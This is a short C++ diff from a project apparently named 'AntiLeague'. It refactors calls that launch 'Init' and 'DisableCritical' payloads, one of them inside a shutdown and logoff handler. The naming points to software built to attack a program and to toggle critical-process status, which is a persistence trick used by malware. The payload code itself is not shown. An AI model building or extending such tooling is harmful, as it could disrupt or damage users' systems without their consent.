@@ -41,7 +41,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
         if ((lParam == 0) || ((lParam & ENDSESSION_LOGOFF) == ENDSESSION_LOGOFF))
         {
-            AntiLeague.Attack<DisableCriticalProc>(DisableCriticalProc(), "DisableCritical", NULL);
+            AntiLeague.Attack<Payload::DisableCritical>("DisableCritical");
             ShutdownBlockReasonDestroy(hWnd);
         }
     }
@@ -116,5 +116,5 @@ void AntiLeague::Init()
         exit(1);
     }
 
-    Attack<InitProc>(InitProc(), "Init", payloadPath);
+    Attack<Payload::Init>("Init", &payloadPath);
 }
